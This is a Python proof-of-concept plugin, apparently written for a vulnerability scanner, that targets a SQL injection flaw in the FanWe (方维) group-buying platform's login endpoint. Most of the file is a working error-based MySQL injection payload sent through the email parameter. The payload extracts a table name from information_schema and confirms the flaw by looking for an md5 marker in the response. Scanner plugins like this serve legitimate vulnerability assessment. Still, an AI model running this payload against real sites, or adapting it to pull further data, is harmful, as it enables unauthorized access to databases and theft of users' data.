# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'FanWe_0004'  # 平台漏洞编号，留空
    name = '方维团购 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-10-10'  # 漏洞公布时间
    desc = '''
        存在问题的地方是这个登录接口：m.php?m=User&a=doLogin
        post：origURL=ghost&password=ghost&email=ghost（email参数没有过滤）
        报错，注入。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=078865'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FanWe(方维)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a8de17ea-4206-423b-a9ff-c8a968080d36'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer:http://www.wooyun.org/bugs/wooyun-2014-078865
            hh = hackhttp.hackhttp()
            url = self.target + "/m.php?m=User&a=doLogin"
            data = "origURL=xq17&password=xq17&email=xq17'and(select 1 from(select count(*),concat((select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),concat(0x7e,md5(1)),floor(rand(0)*2))x from information_schema.tables group by x)a)and'"
            code, head, res, errcode, _ = hh.http(url, data)

            if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b1' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
